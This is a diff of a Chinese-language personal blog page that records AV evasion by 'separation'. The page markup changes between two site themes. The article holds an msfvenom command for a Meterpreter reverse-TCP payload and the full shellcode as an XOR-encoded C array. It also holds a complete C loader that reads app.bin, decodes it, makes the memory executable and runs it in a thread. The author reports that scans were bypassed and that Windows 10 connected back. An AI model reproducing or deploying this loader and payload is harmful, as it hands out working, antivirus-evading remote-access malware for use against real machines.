@@ -1,121 +1,202 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    
-
-    
-<script>!function(){document.documentElement.classList.toggle("dark",!0)}()</script>
-    
-
-<meta charset="utf-8" >
-
-<title>2023-12-21-记录一次分离免杀</title>
-<meta name="keywords" content="2023-12-21-记录一次分离免杀, The simpler, the happier">
-<meta name="description" content="linkshttps://luckyfuture.top/BypassAVLearning.html
-contentshellcode是msf生成的
-12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows/m">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="linkshttps:&#x2F;&#x2F;luckyfuture.top&#x2F;BypassAVLearning.html https:&#x2F;&#x2F;luckyfuture.top&#x2F;BypassAVLearning2.html 从 文件 读取用的是文件分离的方式 shellcode是msf生成的 12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp">
+<meta property="og:type" content="article">
 <meta property="og:title" content="2023-12-21-记录一次分离免杀">
-<meta property="og:description" content="linkshttps://luckyfuture.top/BypassAVLearning.html
-contentshellcode是msf生成的
-12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows/m">
-
-<link rel="shortcut icon" href="/favicon.ico">
-<link rel="stylesheet" href="/style/main.css">
-
-  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 7.0.0"></head>
-  <body>
-    <div id="app" class="main">
-
-<div class="site-header-container">
-  <div class="site-header">
-    <div class="left">
-      <a href="https://redqx.github.io">
-        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
-      </a>
-      <a href="https://redqx.github.io">
-        <h1 class="site-title">The simpler, the happier</h1>
-      </a>
-    </div>
-    <div class="right">
-        <i class="icon menu-switch icon-menu-outline" ></i>
-    </div>
-  </div>
-</div>
-
-<div class="menu-container" style="height: 0;opacity: 0;">
-<nav class="menu-list">
-  
+<meta property="og:url" content="https://redqx.github.io/2023/0c1fd443a427/index.html">
+<meta property="og:site_name" content="The simpler, the happier">
+<meta property="og:description" content="linkshttps:&#x2F;&#x2F;luckyfuture.top&#x2F;BypassAVLearning.html https:&#x2F;&#x2F;luckyfuture.top&#x2F;BypassAVLearning2.html 从 文件 读取用的是文件分离的方式 shellcode是msf生成的 12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221183011197.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221183026865.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221183910864.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221183045332.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221183343176.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221183325080.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231221192648020.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226010325334.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226010247838.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226004058338.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226004036820.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226004132593.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226004154407.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226012014403.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226012252501.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226012803746.png">
+<meta property="og:image" content="https://redqx.github.io/img/image-20231226013120001.png">
+<meta property="article:published_time" content="2023-12-21T10:20:35.538Z">
+<meta property="article:modified_time" content="2023-12-25T17:31:54.651Z">
+<meta property="article:author" content="redqx">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://redqx.github.io/img/image-20231221183011197.png">
     
-      <a href="/" class="menu purple-link">
-        首页
-      </a>
     
-  
-    
-      <a href="/tags/" class="menu purple-link">
-        标签
-      </a>
-    
-  
-    
-      <a href="/categories/" class="menu purple-link">
-        分类
-      </a>
-    
-  
-    
-      <a href="/archives/" class="menu purple-link">
-        归档
-      </a>
-    
-  
-    
-      <a href="/about/" class="menu purple-link">
-        关于
-      </a>
-    
-  
-</nav>
-</div>
-
-
-
-  <div class="content-container">
-    <div class="post-detail">
       
-      <h2 class="post-title">2023-12-21-记录一次分离免杀</h2>
-      <div class="post-info post-detail-info">
-        <span><i class="icon icon-calendar-outline"></i> 2023-12-21</span>
         
-          <span>
-          <i class="icon icon-pricetags-outline"></i>
-            
-              <a href="/tags/blog/">
-              blog
-                
-              </a>
-            
-          </span>
+          <link rel="shortcut icon" href="/images/favicon.ico">
         
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023-12-21-记录一次分离免杀</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories">categories</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/77963b1ac513/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/0c17fac5216a/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://redqx.github.io/2023/0c1fd443a427/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://redqx.github.io/2023/0c1fd443a427/&text=2023-12-21-记录一次分离免杀"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://redqx.github.io/2023/0c1fd443a427/&is_video=false&description=2023-12-21-记录一次分离免杀"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023-12-21-记录一次分离免杀&body=Check out this article: https://redqx.github.io/2023/0c1fd443a427/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://redqx.github.io/2023/0c1fd443a427/&name=2023-12-21-记录一次分离免杀&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://redqx.github.io/2023/0c1fd443a427/&t=2023-12-21-记录一次分离免杀"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#links"><span class="toc-number">1.</span> <span class="toc-text">links</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E-%E6%96%87%E4%BB%B6-%E8%AF%BB%E5%8F%96"><span class="toc-number">2.</span> <span class="toc-text">从 文件 读取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E-web%E7%AB%AF-%E8%AF%BB%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">从 web端 读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#winhttp"><span class="toc-number">3.1.</span> <span class="toc-text">winhttp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-C-C-socket%E6%A8%A1%E6%8B%9Fwinhttp"><span class="toc-number">3.1.1.</span> <span class="toc-text">Linux  C&#x2F;C++  socket模拟winhttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%AE%9E%E7%8E%B0winhttp"><span class="toc-number">3.1.2.</span> <span class="toc-text">python实现winhttp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket"><span class="toc-number">3.2.</span> <span class="toc-text">socket</span></a></li></ol></li></ol>
       </div>
-      <div class="post-content-wrapper">
-        <div class="post-content">
-          <h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><p><a target="_blank" rel="noopener" href="https://luckyfuture.top/BypassAVLearning.html">https://luckyfuture.top/BypassAVLearning.html</a></p>
-<h1 id="content"><a href="#content" class="headerlink" title="content"></a>content</h1><p>shellcode是msf生成的</p>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2023-12-21-记录一次分离免杀
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">redqx</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-21T10:20:35.538Z" class="dt-published" itemprop="datePublished">2023-12-21</time>
+        
+        (Updated: <time datetime="2023-12-25T17:31:54.651Z" class="dt-updated" itemprop="dateModified">2023-12-26</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/blog/" rel="tag">blog</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><p><a target="_blank" rel="noopener" href="https://luckyfuture.top/BypassAVLearning.html">https://luckyfuture.top/BypassAVLearning.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://luckyfuture.top/BypassAVLearning2.html">https://luckyfuture.top/BypassAVLearning2.html</a></p>
+<h1 id="从-文件-读取"><a href="#从-文件-读取" class="headerlink" title="从 文件 读取"></a>从 文件 读取</h1><p>用的是文件分离的方式</p>
+<p>shellcode是msf生成的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.127.129 LPORT=4444 -f c</span><br></pre></td></tr></table></figure>
 
 
 
-<p>然后对shellcode进行了一个加密</p>
+<p>然后对shellcode进行了一个加密,然后写入我们的文件app.bin中</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x7f\x81\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">    buf[i] ^= <span class="number">0x17</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>异或处理了一下</p>
-<p>然后写入文件app.bin</p>
+
+
 <p>加载器如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BYTE* <span class="title function_">read2Mem</span><span class="params">(<span class="type">char</span>* fpath,<span class="type">int</span>* flen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 打开文件</span></span><br><span class="line">    DWORD fileSize;</span><br><span class="line">    LPVOID pMemory;</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    *flen = <span class="number">0</span>;</span><br><span class="line">    HANDLE hFile = CreateFileA(fpath,  <span class="comment">// 文件路径，根据实际情况进行修改</span></span><br><span class="line">        GENERIC_READ,               <span class="comment">// 访问模式，只读</span></span><br><span class="line">        <span class="number">0</span>,                          <span class="comment">// 共享模式，不共享</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// 安全特性，使用默认值</span></span><br><span class="line">        OPEN_EXISTING,              <span class="comment">// 打开已存在的文件</span></span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,      <span class="comment">// 文件属性，正常</span></span><br><span class="line">        <span class="literal">NULL</span>                        <span class="comment">// 模板文件句柄，不使用</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法打开文件\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取文件大小</span></span><br><span class="line">    fileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (fileSize == INVALID_FILE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法获取文件大小\n&quot;</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存</span></span><br><span class="line">    pMemory = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,                   <span class="comment">// 指定分配的地址，在此使用 NULL 表示由系统选择</span></span><br><span class="line">        fileSize,               <span class="comment">// 分配的内存大小，与文件大小一致</span></span><br><span class="line">        MEM_COMMIT,             <span class="comment">// 内存分配类型，表示提交内存</span></span><br><span class="line">        PAGE_READWRITE          <span class="comment">// 内存页面属性，读写权限</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法分配内存\n&quot;</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ReadFile(</span><br><span class="line">        hFile,                  <span class="comment">// 文件句柄</span></span><br><span class="line">        pMemory,                <span class="comment">// 缓冲区地址，用于接收文件内容</span></span><br><span class="line">        fileSize,               <span class="comment">// 要读取的字节数，与文件大小一致</span></span><br><span class="line">        &amp;bytesRead,             <span class="comment">// 实际读取的字节数</span></span><br><span class="line">        <span class="literal">NULL</span>                    <span class="comment">// 用于传递异步 I/O 句柄，不使用</span></span><br><span class="line">    )) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;读取文件失败\n&quot;</span>);</span><br><span class="line">        VirtualFree(pMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="comment">//VirtualFree(pMemory, 0, MEM_RELEASE);</span></span><br><span class="line">    *flen = fileSize;</span><br><span class="line">    <span class="keyword">return</span> pMemory;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( )</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">//shellcode长度</span></span><br><span class="line">	DWORD dwThreadId;	<span class="comment">//线程Id</span></span><br><span class="line">	HANDLE hThread;		<span class="comment">//线程句柄</span></span><br><span class="line">	DWORD dwOldProtect;	<span class="comment">//内存页属性</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* buf=read2Mem(<span class="string">&quot;./app.bin&quot;</span>,&amp;shellcode_size);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] ^= <span class="number">0x17</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span>* shellcode = (<span class="type">char</span>*)VirtualAlloc(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">4096</span>,</span><br><span class="line">		MEM_COMMIT,</span><br><span class="line">		PAGE_READWRITE  <span class="comment">//只申请可读可写</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">memcpy</span>(shellcode, buf, shellcode_size); <span class="comment">//将shellcode复制到可读可写的内存中</span></span><br><span class="line">	VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect); <span class="comment">//更改属性为可执行</span></span><br><span class="line">	hThread = CreateThread(</span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">		 shellcode, <span class="comment">// 函数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">		&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -133,89 +214,259 @@ contentshellcode是msf生成的
 
 
 <p>然后主动扫描一下</p>
-<p><a class="simple-lightbox" href="/./img/image-20231221183011197.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183011197.png"  alt="image-20231221183011197" lazyload></a></p>
-<p><a class="simple-lightbox" href="/./img/image-20231221183026865.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183026865.png"  alt="image-20231221183026865" lazyload></a></p>
+<p><img src="/./img/image-20231221183011197.png" alt="image-20231221183011197"></p>
+<p><img src="/./img/image-20231221183026865.png" alt="image-20231221183026865"></p>
+<p>vt扫描一下</p>
+<p><img src="/./img/image-20231221183910864.png" alt="image-20231221183910864"></p>
 <p>然后上线测试</p>
-<p><a class="simple-lightbox" href="/./img/image-20231221183045332.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183045332.png"  alt="image-20231221183045332" lazyload></a></p>
+<p><img src="/./img/image-20231221183045332.png" alt="image-20231221183045332"></p>
 <p>win10</p>
-<p><a class="simple-lightbox" href="/./img/image-20231221183343176.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183343176.png"  alt="image-20231221183343176" lazyload></a></p>
+<p><img src="/./img/image-20231221183343176.png" alt="image-20231221183343176"></p>
 <p>然后监听成功</p>
-<p><a class="simple-lightbox" href="/./img/image-20231221183325080.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183325080.png"  alt="image-20231221183325080" lazyload></a></p>
+<p><img src="/./img/image-20231221183325080.png" alt="image-20231221183325080"></p>
 <p>感觉很离谱</p>
 <p>怎么这么简单就绕过了…..</p>
+<blockquote>
+<p>但是</p>
+</blockquote>
